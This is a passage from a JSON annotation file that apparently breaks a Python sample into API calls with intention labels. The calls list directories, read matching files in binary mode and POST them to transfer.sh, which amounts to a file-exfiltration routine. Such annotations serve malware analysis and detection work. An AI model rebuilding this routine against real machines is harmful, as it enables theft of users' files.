              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "pathF + \"/\" + file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathF + \"/\" + file, mode='rb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "\"https://transfer.sh/\", files=files",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path + \"/\" + file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path + \"/\" + file",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=bc_create_file, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            }
          ]
        }
      ]
    }
  ]
}